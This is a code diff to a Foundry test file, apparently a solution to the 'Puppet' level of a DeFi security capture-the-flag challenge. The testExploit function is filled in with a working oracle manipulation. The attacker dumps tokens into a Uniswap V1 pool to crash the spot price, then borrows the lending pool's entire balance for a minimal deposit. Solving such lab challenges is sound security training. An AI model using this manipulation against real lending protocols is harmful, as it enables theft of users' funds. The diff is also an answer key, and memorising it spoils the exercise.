@@ -58,7 +58,7 @@ contract Puppet is Test {
 
         uniswapV1Factory = UniswapV1Factory(deployCode("./src/build-uniswap/v1/UniswapV1Factory.json"));
 
-        // Deploy a exchange that will be used as the factory template
+        // Deploy a exchange that will be used as the factory template -> deploying from ABI because contracts are written in Vyper
         uniswapV1ExchangeTemplate = UniswapV1Exchange(deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json"));
 
         // Deploy factory, initializing it with the address of the template exchange
@@ -97,13 +97,12 @@ contract Puppet is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-
-        /**
-         * EXPLOIT END *
-         */
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapExchange), ATTACKER_INITIAL_TOKEN_BALANCE);
+        uniswapExchange.tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE, 1, DEADLINE);
+        uint256 depositRequired = puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        puppetPool.borrow{value: depositRequired}(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
